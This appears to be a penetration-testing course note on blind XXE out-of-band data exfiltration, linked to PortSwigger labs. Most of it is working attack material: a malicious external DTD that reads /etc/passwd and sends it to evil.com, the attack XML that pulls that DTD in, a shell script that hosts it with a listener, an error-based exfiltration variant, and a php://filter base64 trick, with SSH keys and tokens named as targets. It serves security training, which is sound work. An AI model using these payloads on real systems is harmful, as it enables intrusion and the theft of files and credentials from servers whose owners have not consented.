---
tags: [vapt, xxe, intermediate]
difficulty: intermediate
module: "14 - XXE"
topic: "14.06 Blind XXE — OOB Data Exfiltration"
portswigger_labs: ["Blind XXE with out-of-band interaction", "Blind XXE with out-of-band interaction via XML parameter entities", "Exploiting blind XXE to exfiltrate data using a malicious external DTD", "Exploiting blind XXE to retrieve data via error messages"]
---

# 14.06 — Blind XXE: OOB Data Exfiltration

## What Is Blind XXE?

```
BLIND XXE:
  Server parses the XXE payload...
  BUT response doesn't include the entity value!
  
  Examples:
  - XML is parsed but response is just "OK" or 200 with no body
  - Entity value is in an XML field that's not echoed
  - Error responses don't include entity content
  
  SOLUTION: Out-of-Band (OOB) techniques
  Make the server send the data TO YOU instead of returning it in response!
```

---

## Step 1 — Confirming Blind XXE Exists

```xml
<!-- USE BURP COLLABORATOR TO CONFIRM: -->

<!-- PAYLOAD 1: HTTP interaction: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://YOUR_BURP_COLLABORATOR.burpcollaborator.net/">
]>
<root><data>&xxe;</data></root>

<!-- PAYLOAD 2: Parameter entity (some parsers only allow this for external): -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://YOUR_BURP_COLLABORATOR.burpcollaborator.net/">
  %xxe;
]>
<root><data>test</data></root>

<!-- IF BURP COLLABORATOR RECEIVES DNS/HTTP INTERACTION:
  → BLIND XXE CONFIRMED!
  → Server is parsing XML and fetching external URLs!
-->
```

---

## Step 2 — Exfiltrate Data via External DTD

```
THE PROBLEM WITH IN-LINE EXFIL:
  You can't use a parameter entity inside another parameter entity
  in an INLINE DTD!
  
  This doesn't work (security restriction):
  <!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://evil.com/?d=%file;">  ← ERROR!
  ]>
  
  SOLUTION: Use an EXTERNAL DTD!
  Host the malicious DTD on your server.
  Parameter entities INSIDE an external DTD CAN reference each other!
```

---

## The Malicious External DTD

```xml
<!-- HOST THIS ON YOUR SERVER AS: evil.dtd -->

<!-- evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/steal?data=%file;'>">
%eval;
%exfil;

<!-- EXPLANATION:
  %file → reads /etc/passwd content
  %eval → defines a new parameter entity %exfil using %file's value
         (&#x25; is URL-encoded % so it's not interpreted yet)
  %eval; → executes the definition → creates %exfil
  %exfil; → executes → sends HTTP request to evil.com with file contents!
-->
```

---

## The Attack XML (Requests External DTD)

```xml
<!-- SEND THIS TO VULNERABLE APP: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>

<!-- FLOW:
  1. App parses XML
  2. Finds: %dtd SYSTEM "http://evil.com/evil.dtd"
  3. Fetches evil.dtd from evil.com
  4. Processes evil.dtd: reads /etc/passwd, sends to evil.com
  5. evil.com logs: GET /steal?data=root:x:0:0:root...
  6. Attacker reads /etc/passwd from server logs!
-->
```

---

## Setting Up the Receiver

```bash
# OPTION 1: BURP COLLABORATOR (simplest):
# Use Burp Pro → Collaborator Client → get unique URL
# Modify evil.dtd to send to Collaborator URL
# Data appears in Collaborator interactions

# OPTION 2: PYTHON HTTP SERVER:
python3 -m http.server 8080
# Serves evil.dtd AND logs all incoming requests
# Check terminal for: GET /steal?data=...

# OPTION 3: NGROK + PYTHON:
ngrok http 8080
# Get public URL: https://xxxx.ngrok.io
# Start server: python3 -m http.server 8080
# Use https://xxxx.ngrok.io/evil.dtd in payload

# FULL SETUP SCRIPT:
mkdir /tmp/xxe-server
cat > /tmp/xxe-server/evil.dtd << 'DTDEOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8080/steal?d=%file;'>">
%eval;
%exfil;
DTDEOF

cd /tmp/xxe-server
python3 -m http.server 8080
# Watch for incoming requests!
```

---

## Exfiltrate Longer Files via Error Messages

```xml
<!-- ALTERNATIVE: TRIGGER AN ERROR THAT INCLUDES THE FILE CONTENTS -->

<!-- HOST error.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- EFFECT:
  Parser tries to open: file:///nonexistent/root:x:0:0:root...
  This FILE DOESN'T EXIST → parser throws error!
  ERROR MESSAGE INCLUDES THE PATH → includes /etc/passwd content!
  If error is returned in response → file contents leaked!
  
  Even if only error messages are returned (not entity values),
  this trick exfiltrates data through error paths!
-->
```

---

## Data Size Limitation

```
PROBLEM: File contents may be truncated in URL parameters!
  http://evil.com/steal?data=root:x:0:0:root:/root:/bin/bash\ndaemon...
  URLs have length limits (~2000 chars for some servers)
  
SOLUTIONS:
  1. Read small files (SSH keys, passwords, tokens — usually < 2000 chars)
  2. Use POST request in exfil (gopher:// in some parsers)
  3. Read specific lines: use XPath or other tricks
  4. Encode data: base64 to avoid special chars
  
PHP FILTER TRICK (base64 encode):
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  → Returns base64 string (no special chars → no truncation issues)
  → Decode locally: echo "BASE64OUTPUT" | base64 -d
```

---

## Related Notes
- [[01 - What is XXE]] — fundamentals
- [[03 - Classic XXE File Read]] — in-band file read
- [[07 - XXE via XInclude]] — alternative XXE technique
- [[09 - XXE WAF Bypass]] — bypass defenses
- [[Module 13 - SSRF — Blind SSRF]] — OOB techniques comparison
